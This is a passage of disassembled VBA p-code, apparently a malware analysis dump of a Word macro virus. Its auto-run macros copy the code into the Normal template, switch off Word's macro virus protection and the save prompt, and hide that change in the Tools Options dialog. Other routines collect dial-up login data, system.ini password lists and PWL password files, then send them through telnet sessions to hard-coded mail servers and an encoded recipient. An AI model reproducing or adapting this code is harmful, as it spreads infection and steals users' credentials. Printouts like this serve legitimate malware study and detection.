' 	Ld MessStr 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St Tmp 
' Line #373:
' 	Ld Tmp 
' 	SelectCase 
' Line #374:
' 	LitStr 0x0001 "#"
' 	CaseEq 
' 	CaseDone 
' Line #375:
' 	ArgsCall DoEvents 0x0000 
' Line #376:
' 	Ld hwnd 
' 	LitHI2 0x0102 
' 	LitDI2 0x000D 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsLd SendMessage 0x0004 
' 	St Charset 
' Line #377:
' 	LitStr 0x0001 "$"
' 	CaseEq 
' 	CaseDone 
' Line #378:
' 	LitDI2 0x0007 
' 	ArgsCall Pause 0x0001 
' Line #379:
' 	CaseElse 
' Line #380:
' 	Ld i 
' 	LitDI2 0x017C 
' 	Mod 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #381:
' 	LitDI2 0x0001 
' 	ArgsCall Pause 0x0001 
' Line #382:
' 	EndIfBlock 
' Line #383:
' 	Ld hwnd 
' 	LitHI2 0x0102 
' 	Ld Tmp 
' 	ArgsLd Asc 0x0001 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsLd SendMessage 0x0004 
' 	St Charset 
' Line #384:
' 	EndSelect 
' Line #385:
' 	StartForVariable 
' 	Next 
' Line #386:
' 	EndSub 
' Line #387:
' 	FuncDefn (Sub AutoExit())
' Line #388:
' 	Dim 
' 	VarDefn Counter (As Long)
' Line #389:
' 	Dim 
' 	VarDefn i (As Long)
' Line #390:
' 	Dim 
' 	VarDefn Yes (As Boolean)
' Line #391:
' 	Dim 
' 	VarDefn VBComponent (As Object)
' Line #392:
' Line #393:
' 	OnError (Resume Next) 
' Line #394:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt Visible 
' Line #395:
' 	LitVarSpecial (False)
' 	St Yes 
' Line #396:
' 	StartForVariable 
' 	Ld VBComponent 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #397:
' 	Ld VBComponent 
' 	MemLd New 
' 	LitStr 0x0007 "MSPluss"
' 	Eq 
' 	IfBlock 
' Line #398:
' 	LitVarSpecial (True)
' 	St Yes 
' Line #399:
' 	EndIfBlock 
' Line #400:
' 	StartForVariable 
' 	Next 
' Line #401:
' 	Ld Yes 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #402:
' 	Ld Templates 
' 	MemLd Count 
' 	St Counter 
' Line #403:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Counter 
' 	For 
' Line #404:
' 	LitDI2 0x0001 
' 	Ld i 
' 	ArgsLd Templates 0x0001 
' 	MemLd FullName 
' 	LitStr 0x0007 "STARTUP"
' 	Ld vbTextCompare 
' 	FnInStr4 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #405:
' 	Ld i 
' 	ArgsLd Templates 0x0001 
' 	ArgsMemCall OpenAsDocument 0x0000 
' Line #406:
' 	Ld i 
' 	ArgsLd Templates 0x0001 
' 	ArgsCall CopyLines 0x0001 
' Line #407:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #408:
' 	EndIfBlock 
' Line #409:
' 	StartForVariable 
' 	Next 
' Line #410:
' 	EndIfBlock 
' Line #411:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #412:
' 	ArgsCall Tmsn 0x0000 
' Line #413:
' 	EndSub 
' Line #414:
' Line #415:
' 	FuncDefn (Sub Pause(i As Byte))
' Line #416:
' 	Dim 
' 	VarDefn Start (As Long)
' Line #417:
' 	Ld Timer 
' 	St Start 
' Line #418:
' 	Ld Timer 
' 	Ld Start 
' 	Ld i 
' 	Add 
' 	Lt 
' 	DoWhile 
' Line #419:
' 	ArgsCall DoEvents 0x0000 
' Line #420:
' 	Loop 
' Line #421:
' 	EndSub 
' Line #422:
' 	FuncDefn (Function Check_Connection())
' Line #423:
' 	Dim 
' 	VarDefn CurrWnd (As Long)
' Line #424:
' 	Dim 
' 	VarDefn Length (As Long)
' Line #425:
' 	Dim 
' 	VarDefn Title (As String)
' Line #426:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	LitStr 0x0000 ""
' 	ArgsLd FindWindow 0x0002 
' 	St CurrWnd 
' Line #427:
' 	Ld CurrWnd 
' 	LitDI2 0x0000 
' 	ArgsLd GetWindow 0x0002 
' 	St CurrWnd 
' Line #428:
' 	Ld CurrWnd 
' 	LitDI2 0x0000 
' 	Ne 
' 	DoWhile 
' Line #429:
' 	Ld CurrWnd 
' 	ArgsLd GetWindowTextLength 0x0001 
' 	St Length 
' Line #430:
' 	Ld Length 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Space 0x0001 
' 	St Title 
' Line #431:
' 	Ld CurrWnd 
' 	Ld Title 
' 	Ld Length 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd GetWindowText 0x0003 
' 	St Length 
' Line #432:
' 	LineCont 0x0004 0D 00 05 00
' 	LitDI2 0x0001 
' 	Ld Title 
' 	LitStr 0x000C "Connected to"
' 	Ld vbTextCompare 
' 	FnInStr4 
' 	LitDI2 0x0000 
' 	Ne 
' 	LitDI2 0x0001 
' 	Ld Title 
' 	LitStr 0x000C "Ïîäêëþ÷åíî ê"
' 	Ld vbTextCompare 
' 	FnInStr4 
' 	LitDI2 0x0000 
' 	Ne 
' 	Or 
' 	IfBlock 
' Line #433:
' 	LitVarSpecial (True)
' 	St Check_Connection 
' Line #434:
' 	ExitFunc 
' Line #435:
' 	EndIfBlock 
' Line #436:
' 	Ld CurrWnd 
' 	LitDI2 0x0002 
' 	ArgsLd GetWindow 0x0002 
' 	St CurrWnd 
' Line #437:
' 	ArgsCall DoEvents 0x0000 
' Line #438:
' 	Loop 
' Line #439:
' 	LitVarSpecial (False)
' 	St Check_Connection 
' Line #440:
' 	EndFunc 
' Line #441:
' 	QuoteRem 0x0000 0x0008 " End Sub"
' Line #442:
' 	FuncDefn (Sub AutoOpen())
' Line #443:
' 	Dim 
' 	VarDefn VBComponent (As Object)
' Line #444:
' 	Dim 
' 	VarDefn Yes (As Boolean)
' Line #445:
' 	OnError (Resume Next) 
' Line #446:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ShowSpellingErrors 
' Line #447:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ShowGrammaticalErrors 
' Line #448:
' 	LitVarSpecial (False)
' 	St Yes 
' Line #449:
' 	StartForVariable 
' 	Ld VBComponent 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #450:
' 	Ld VBComponent 
' 	MemLd New 
' 	LitStr 0x0007 "MSPluss"
' 	Eq 
' 	IfBlock 
' Line #451:
' 	LitVarSpecial (True)
' 	St Yes 
' Line #452:
' 	EndIfBlock 
' Line #453:
' 	StartForVariable 
' 	Next 
' Line #454:
' 	Ld Yes 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #455:
' 	Ld MacroContainer 
' 	ArgsCall CopyLines 0x0001 
' Line #456:
' 	EndIfBlock 
' Line #457:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #458:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #459:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #460:
' 	EndSub 
' Line #461:
' 	FuncDefn (Function Loto(i As Integer, A As ))
' Line #462:
' 	Dim 
' 	VarDefn n (As Integer)
' Line #463:
' 	LitDI2 0x0001 
' 	Ld i 
' 	RedimAs A 0x0001 (As Integer)
' Line #464:
' 	Dim 
' 	VarDefn Tmp (As Integer)
' Line #465:
' 	Dim 
' 	VarDefn Temp (As Integer)
' Line #466:
' 	StartForVariable 
' 	Ld n 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld i 
' 	For 
' Line #467:
' 	Ld n 
' 	Ld n 
' 	ArgsSt A 0x0001 
' Line #468:
' 	StartForVariable 
' 	Next 
' Line #469:
' 	StartForVariable 
' 	Ld n 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld i 
' 	For 
' Line #470:
' 	ArgsCall Read 0x0000 
' Line #471:
' 	Ld i 
' 	Ld n 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	Ld n 
' 	Add 
' 	FnInt 
' 	St Tmp 
' Line #472:
' 	Ld n 
' 	ArgsLd A 0x0001 
' 	St Temp 
' Line #473:
' 	Ld Tmp 
' 	ArgsLd A 0x0001 
' 	Ld n 
' 	ArgsSt A 0x0001 
' Line #474:
' 	Ld Temp 
' 	Ld Tmp 
' 	ArgsSt A 0x0001 
' Line #475:
' 	StartForVariable 
' 	Next 
' Line #476:
' 	EndFunc 
' Line #477:
' 	QuoteRem 0x0000 0x0008 " End Sub"
' Line #478:
' 	FuncDefn (Sub ToolsOptions())
' Line #479:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #480:
' 	LitVarSpecial (True)
' 	MemStWith VirusProtection 
' Line #481:
' 	LitVarSpecial (True)
' 	MemStWith SaveNormalPrompt 
' Line #482:
' 	EndWith 
' Line #483:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #484:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #485:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #486:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #487:
' 	EndWith 
' Line #488:
' 	EndSub 
' Line #489:
' 	FuncDefn (Sub AutoClose())
' Line #490:
' 	OnError (Resume Next) 
' Line #491:
' 	ArgsCall AutoOpen 0x0000 
' Line #492:
' 	EndSub 
' Line #493:
' Line #494:
' 	FuncDefn (Function Grab(New As String))
' Line #495:
' 	Dim 
' 	VarDefn Tmp (As String)
' Line #496:
' 	Dim 
' 	VarDefn AZ (As String)
' Line #497:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #498:
' 	Dim 
' 	VarDefn Num (As Integer)
' Line #499:
' 	Dim 
' 	VarDefn PwdLst (As String)
' Line #500:
' 	Dim 
' 	VarDefn Temp (As String)
' Line #501:
' 	Dim 
' 	VarDefn Counter (As Long)
' Line #502:
' 	Dim 
' 	VarDefn NF (As Integer)
' Line #503:
' 	Dim 
' 	VarDefn NF1 (As Integer)
' Line #504:
' 	LitStr 0x001A "abcdifghijklmnopqastuvwxyz"
' 	St AZ 
' Line #505:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0007 
' 	For 
' Line #506:
' 	LitDI2 0x0019 
' 	ArgsLd Random1 0x0001 
' 	St Num 
' Line #507:
' 	Ld New 
' 	Ld AZ 
' 	Ld Num 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St New 
' Line #508:
' 	StartForVariable 
' 	Next 
' Line #509:
' 	Ld New 
' 	LitStr 0x0004 ".egn"
' 	Add 
' 	St New 
' Line #510:
' 	OnError (Resume Next) 
' Line #511:
' 	Ld Friend 
' 	St NF1 
' Line #512:
' 	LitStr 0x000B "c:\windows\"
' 	Ld New 
' 	Add 
' 	Ld NF1 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output Access Write)
' Line #513:
' 	LitStr 0x0016 "c:\windows\edialer.ini"
' 	ArgsLd Dir$ 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #514:
' 	Ld Friend 
' 	St NF 
' Line #515:
' 	LitStr 0x0016 "c:\windows\edialer.ini"
' 	Ld NF 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input Access Read)
' Line #516:
' 	Ld NF 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #517:
' 	Ld NF 
' 	Ld Tmp 
' 	LineInput 
' Line #518:
' 	LineCont 0x0008 0C 00 05 00 17 00 05 00
' 	LitDI2 0x0001 
' 	Ld Tmp 
' 	LitStr 0x000B "[RAS_Entry_"
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Ne 
' 	LitDI2 0x0001 
' 	Ld Tmp 
' 	LitStr 0x000D "PasswordSaved"
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Ne 
' 	Or 
' 	LitDI2 0x0001 
' 	Ld Tmp 
' 	LitStr 0x000A "LoginSaved"
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Ne 
' 	Or 
' 	IfBlock 
' Line #519:
' 	Ld NF1 
' 	Sharp 
' 	PrintChan 
' 	Ld Tmp 
' 	PrintItemNL 
' Line #520:
' 	EndIfBlock 
' Line #521:
' 	Loop 
' Line #522:
' 	Ld NF 
' 	Sharp 
' 	Close 0x0001 
' Line #523:
' 	EndIfBlock 
' Line #524:
' 	LitStr 0x0015 "C:\Windows\system.ini"
' 	ArgsLd Dir$ 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #525:
' 	Ld Friend 
' 	St NF 
' Line #526:
' 	LitStr 0x0015 "C:\Windows\system.ini"
' 	Ld NF 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input Access Read)
' Line #527:
' 	Ld NF 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #528:
' 	Ld NF 
' 	Ld Temp 
' 	LineInput 
' Line #529:
' 	Ld Counter 
' 	LitDI2 0x0001 
' 	Add 
' 	St Counter 
' Line #530:
' 	Ld Temp 
' 	LitStr 0x0010 "[Password Lists]"
' 	Eq 
' 	IfBlock 
' Line #531:
' 	Ld Temp 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #532:
' 	Ld NF 
' 	Ld Temp 
' 	LineInput 
' Line #533:
' 	Ld PwdLst 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld Temp 
' 	Add 
' 	St PwdLst 
' Line #534:
' 	Loop 
' Line #535:
' 	ExitDo 
' Line #536:
' 	EndIfBlock 
' Line #537:
' 	Ld Counter 
' 	LitDI2 0x0014 
' 	Mod 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #538:
' 	ArgsCall DoEvents 0x0000 
' Line #539:
' 	EndIfBlock 
' Line #540:
' 	Loop 
' Line #541:
' 	EndIfBlock 
' Line #542:
' 	Ld NF 
' 	Sharp 
' 	Close 0x0001 
' Line #543:
' 	Ld NF1 
' 	Sharp 
' 	PrintChan 
' 	Ld PwdLst 
' 	PrintItemNL 
' Line #544:
' 	Ld NF1 
' 	Sharp 
' 	PrintChan 
' 	ArgsLd Grab_Registr_main 0x0000 
' 	PrintItemNL 
' Line #545:
' 	Ld NF1 
' 	Sharp 
' 	Close 0x0001 
' Line #546:
' 	EndFunc 
' Line #547:
' 	QuoteRem 0x0000 0x0008 " End Sub"
' Line #548:
' 	FuncDefn (Sub Sender_main())
' Line #549:
' 	Dim 
' 	VarDefn Handle (As Long)
' Line #550:
' 	Dim 
' 	VarDefn HandleBW (As Long)
' Line #551:
' 	Dim 
' 	VarDefn hwnd (As Long)
' Line #552:
' 	Dim 
' 	VarDefn FileName (As String)
' Line #553:
' 	Dim 
' 	VarDefn Start (As Long)
' Line #554:
' 	Dim 
' 	VarDefn MyDat (As Byte)
' Line #555:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #556:
' 	Dim 
' 	VarDefn NPwl (As String)
' Line #557:
' 	Dim 
' 	VarDefn j (As Integer)
' Line #558:
' 	Dim 
' 	VarDefn Title (As String)
' Line #559:
' 	Dim 
' 	VarDefn SMTP (As String)
' Line #560:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x000E 
' 	VarDefn Host (As String)
' Line #561:
' 	Dim 
' 	VarDefn A (As Integer)
' Line #562:
' 	Dim 
' 	VarDefn False (As Integer)
' Line #563:
' 	Dim 
' 	VarDefn NF (As Integer)
' Line #564:
' 	Dim 
' 	VarDefn THwnd (As Long)
' Line #565:
' 	Dim 
' 	VarDefn Twnd (As String)
' Line #566:
' 	Dim 
' 	VarDefn None (As String)
' Line #567:
' 	Dim 
' 	VarDefn Kashek (As String)
' Line #568:
' 	Dim 
' 	VarDefn RecipientOfMessage_ (As String)
' Line #569:
' 	Dim 
' 	VarDefn FNum_ (As Integer)
' Line #570:
' 	Dim 
' 	VarDefn Kashelek (As String)
' Line #571:
' 	OnError (Resume Next) 
' Line #572:
' 	Ld Check_Connection 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #573:
' 	LitStr 0x0024 "cmNwdCB0bzogPHNvcmRvbmdAbWFpbC5jb20+"
' 	St Kashek 
' Line #574:
' 	LitStr 0x000E "<vasya@zoo.kl>"
' 	St RecipientOfMessage_ 
' Line #575:
' 	LitStr 0x000D "ns1.kazna.com"
' 	LitDI2 0x0001 
' 	ArgsSt Host 0x0001 
' Line #576:
' 	LitStr 0x000E "mail.iname.com"
' 	LitDI2 0x0002 
' 	ArgsSt Host 0x0001 
' Line #577:
' 	LitStr 0x000E "194.186.182.26"
' 	LitDI2 0x0003 
' 	ArgsSt Host 0x0001 
' Line #578:
' 	LitStr 0x000C "195.75.32.20"
' 	LitDI2 0x0004 
' 	ArgsSt Host 0x0001 
' Line #579:
' 	LitStr 0x000F "lily.bas-net.by"
' 	LitDI2 0x0005 
' 	ArgsSt Host 0x0001 
' Line #580:
' 	LitStr 0x000C "212.19.17.57"
' 	LitDI2 0x0006 
' 	ArgsSt Host 0x0001 
' Line #581:
' 	LitStr 0x000F "itk2.bas-net.by"
' 	LitDI2 0x0007 
' 	ArgsSt Host 0x0001 
' Line #582:
' 	LitStr 0x0011 "imaph2.bas-net.by"
' 	LitDI2 0x0008 
' 	ArgsSt Host 0x0001 
' Line #583:
' 	LitStr 0x000C "tuna.fsr.com"
' 	LitDI2 0x0009 
' 	ArgsSt Host 0x0001 
' Line #584:
' 	LitStr 0x000F "redfish.fsr.com"
' 	LitDI2 0x000A 
' 	ArgsSt Host 0x0001 
' Line #585:
' 	LitStr 0x000D "tixi.sakha.ru"
' 	LitDI2 0x000B 
' 	ArgsSt Host 0x0001 
' Line #586:
' 	LitStr 0x000E "ns.sovintel.ru"
' 	LitDI2 0x000C 
' 	ArgsSt Host 0x0001 
' Line #587:
' 	LitStr 0x0011 "jupiter.zetcom.ru"
' 	LitDI2 0x000D 
' 	ArgsSt Host 0x0001 
' Line #588:
' 	LitStr 0x0014 "nts_future.future.ru"
' 	LitDI2 0x000E 
' 	ArgsSt Host 0x0001 
' Line #589:
' 	LitDI2 0x000E 
' 	ArgsLd A 0x0000 
' 	ArgsCall Loto 0x0002 
' Line #590:
' 	LitStr 0x0006 "telnet"
' 	LitDI2 0x0000 
' 	ArgsCall Shell 0x0002 
' Line #591:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	LitStr 0x000F "Telnet - (none)"
' 	ArgsLd FindWindow 0x0002 
' 	St THwnd 
' Line #592:
' 	Ld THwnd 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #593:
' 	LitStr 0x0006 "telnet"
' 	St Twnd 
' Line #594:
' 	LitStr 0x0006 "(none)"
' 	St None 
' Line #595:
' 	ElseBlock 
' Line #596:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	LitStr 0x000E "Òåëíåò - (íåò)"
' 	ArgsLd FindWindow 0x0002 
' 	St THwnd 
' Line #597:
' 	Ld THwnd 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #598:
' 	LitStr 0x0006 "Òåëíåò"
' 	St Twnd 
' Line #599:
' 	LitStr 0x0005 "(íåò)"
' 	St None 
' Line #600:
' 	ElseBlock 
' Line #601:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	LitStr 0x000E "Telnet - (íåò)"
' 	ArgsLd FindWindow 0x0002 
' 	St THwnd 
' Line #602:
' 	LitStr 0x0006 "telnet"
' 	St Twnd 
' Line #603:
' 	LitStr 0x0005 "(íåò)"
' 	St None 
' Line #604:
' 	EndIfBlock 
' Line #605:
' 	EndIfBlock 
' Line #606:
' 	Ld THwnd 
' 	LitDI2 0x0010 
' 	Coerce (Lng) 
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsCall SendMessage 0x0004 
' Line #607:
' 	ArgsCall DoEvents 0x0000 
' Line #608:
' 	StartForVariable 
' 	Ld False 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0005 
' 	For 
' Line #609:
' 	LitStr 0x0007 "telnet "
' 	Ld False 
' 	ArgsLd A 0x0001 
' 	ArgsLd Host 0x0001 
' 	Add 
' 	LitStr 0x0003 " 25"
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsCall Shell 0x0002 
' Line #610:
' 	ArgsCall DoEvents 0x0000 
' Line #611:
' 	Ld Timer 
' 	St Start 
' Line #612:
' 	Ld Handle 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld Timer 
' 	Ld Start 
' 	Sub 
' 	LitDI2 0x0046 
' 	Gt 
' 	Or 
' 	Ld HandleBW 
' 	LitDI2 0x0000 
' 	Ne 
' 	Or 
' 	DoUnitil 
' Line #613:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	Ld Twnd 
' 	LitStr 0x0003 " - "
' 	Add 
' 	Ld False 
' 	ArgsLd A 0x0001 
' 	ArgsLd Host 0x0001 
' 	Add 
' 	ArgsLd FindWindow 0x0002 
' 	St Handle 
' Line #614:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	LitStr 0x000E "Connect failed"
' 	ArgsLd FindWindow 0x0002 
' 	St HandleBW 
' Line #615:
' 	ArgsCall DoEvents 0x0000 
' Line #616:
' 	Loop 
' Line #617:
' 	Ld Handle 
' 	SelectCase 
' Line #618:
' 	LitDI2 0x0000 
' 	CaseNe 
' 	CaseDone 
' Line #619:
' 	LitStr 0x0008 "Kashelek"
' 	St Kashelek 
' Line #620:
' 	Ld Friend 
' 	St FNum_ 
' Line #621:
' 	LitStr 0x000B "c:\windows\"
' 	Ld Kashelek 
' 	Add 
' 	Ld FNum_ 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output Access Write)
' Line #622:
' 	Ld FNum_ 
' 	Sharp 
' 	PrintChan 
' 	Ld RecipientOfMessage_ 
' 	PrintItemNL 
' Line #623:
' 	Ld FNum_ 
' 	Sharp 
' 	Close 0x0001 
' Line #624:
' 	LineCont 0x0008 16 00 01 00 1D 00 01 00
' 	LitStr 0x0007 "helo My"
' 	Ld Kashelek 
' 	ArgsLd Base64 0x0001 
' 	Add 
' 	LitStr 0x0023 "#$$mail from: <master@myself.com>#$"
' 	Add 
' 	Ld Kashek 
' 	ArgsLd Decode_ 0x0001 
' 	Add 
' 	LitStr 0x000B "#$rcpt to: "
' 	Add 
' 	Ld RecipientOfMessage_ 
' 	Add 
' 	LitStr 0x000E "#$data#$Date: "
' 	Add 
' 	Ld Date$ 
' 	Add 
' 	LitStr 0x0001 " "
' 	Add 
' 	Ld Time$ 
' 	Add 
' 	LitStr 0x0080 "#X-MSMail-Priority: Normal#X-Priority: 3#X-Mailer: Post Messenger 3.1#MIME-Version: 1.0#Content-Type: multipart/mixed; boundary="
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000E "----=_NextPart"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0084 "#Content-Transfer-Encoding: 7bit##------=_NextPart#Content-Type: text/plain; charset=Windows-1251#Content-Transfer-Encoding: base64#"
' 	Add 
' 	St SMTP 
' Line #625:
' 	Ld SMTP 
' 	Ld Handle 
' 	ArgsCall Filler 0x0002 
' Line #626:
' 	LitDI2 0x0001 
' 	ArgsCall Pause 0x0001 
' Line #627:
' 	LitStr 0x0013 "C:\Windows\Kashelek"
' 	ArgsCall Kill 0x0001 
' Line #628:
' 	Ld FileName 
' 	ArgsCall Grab 0x0001 
' Line #629:
' 	Ld FileName 
' 	ArgsLd Base64 0x0001 
' 	St SMTP 
' Line #630:
' 	LitStr 0x000B "c:\windows\"
' 	Ld FileName 
' 	Add 
' 	ArgsCall Kill 0x0001 
' Line #631:
' 	Ld SMTP 
' 	ArgsLd Adapt 0x0001 
' 	St SMTP 
' Line #632:
' 	Ld SMTP 
' 	Ld Handle 
' 	ArgsCall Filler 0x0002 
' Line #633:
' 	LitDI2 0x0001 
' 	ArgsCall Pause 0x0001 
' Line #634:
' 	Ld i 
' 	ArgsLd NPwl 0x0000 
' 	ArgsCall FindPWL 0x0002 
' Line #635:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #636:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #637:
' 	LitStr 0x000B "c:\windows\"
' 	Ld j 
' 	ArgsLd NPwl 0x0001 
' 	Add 
' 	ArgsLd FileLen 0x0001 
' 	LitDI2 0x02B0 
' 	Ne 
' 	IfBlock 
' Line #638:
' 	Ld j 
' 	ArgsLd NPwl 0x0001 
' 	ArgsLd Base64 0x0001 
' 	St SMTP 
' Line #639:
' 	Ld SMTP 
' 	ArgsLd Adapt 0x0001 
' 	St SMTP 
' Line #640:
' 	LineCont 0x000C 08 00 03 00 15 00 03 00 1B 00 03 00
' 	LitStr 0x003F "#------=_NextPart#Content-Type: application/octet-stream; name="
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld j 
' 	ArgsLd NPwl 0x0001 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0038 "#Content-Transfer-Encoding: base64#Content-Description: "
' 	Add 
' 	Ld j 
' 	ArgsLd NPwl 0x0001 
' 	Add 
' 	LitStr 0x003E "(PWL PassWord List)#Content-Disposition: attachment; filename="
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld j 
' 	ArgsLd NPwl 0x0001 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "#"
' 	Add 
' 	St Title 
' Line #641:
' 	Ld Title 
' 	Ld Handle 
' 	ArgsCall Filler 0x0002 
' Line #642:
' 	LitDI2 0x0001 
' 	ArgsCall Pause 0x0001 
' Line #643:
' 	Ld SMTP 
' 	Ld Handle 
' 	ArgsCall Filler 0x0002 
' Line #644:
' 	LitDI2 0x0001 
' 	ArgsCall Pause 0x0001 
' Line #645:
' 	EndIfBlock 
' Line #646:
' 	StartForVariable 
' 	Next 
' Line #647:
' 	EndIfBlock 
' Line #648:
' 	LitStr 0x001D "##------=_NextPart--#.#$quit#"
' 	St Title 
' Line #649:
' 	Ld Title 
' 	Ld Handle 
' 	ArgsCall Filler 0x0002 
' Line #650:
' 	LitDI2 0x0001 
' 	ArgsCall Pause 0x0001 
' Line #651:
' 	Ld Timer 
' 	St Start 
' Line #652:
' 	Ld hwnd 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld Timer 
' 	Ld Start 
' 	Sub 
' 	LitDI2 0x0078 
' 	Gt 
' 	Or 
' 	DoUnitil 
' Line #653:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	Ld Twnd 
' 	ArgsLd FindWindow 0x0002 
' 	St hwnd 
' Line #654:
' 	ArgsCall DoEvents 0x0000 
' Line #655:
' 	Loop 
' Line #656:
' 	Ld hwnd 
' 	SelectCase 
' Line #657:
' 	LitDI2 0x0000 
' 	CaseEq 
' 	CaseDone 
' Line #658:
' 	Ld Handle 
' 	LitDI2 0x0010 
' 	Coerce (Lng) 
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsCall SendMessage 0x0004 
' Line #659:
' 	LitDI2 0x0000 
' 	St Handle 
' Line #660:
' 	CaseElse 
' Line #661:
' 	Ld hwnd 
' 	LitDI2 0x0010 
' 	Coerce (Lng) 
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsCall SendMessage 0x0004 
' Line #662:
' 	Ld Friend 
' 	St NF 
' Line #663:
' 	Ld Date$ 
' 	LitDI2 0x0004 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Val 0x0001 
' 	St MyDat 
' Line #664:
' 	LitStr 0x0014 "c:\windows\logow.sys"
' 	Ld NF 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary Access Write)
' Line #665:
' 	Ld NF 
' 	Sharp 
' 	LitDI4 0x2CBD 0x0001 
' 	Ld MyDat 
' 	PutRec 
' Line #666:
' 	Ld NF 
' 	Sharp 
' 	Close 0x0001 
' Line #667:
' 	ArgsCall DoEvents 0x0000 
' Line #668:
' 	Ld Handle 
' 	LitDI2 0x0010 
' 	Coerce (Lng) 
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsCall SendMessage 0x0004 
' Line #669:
' 	ExitSub 
' Line #670:
' 	EndSelect 
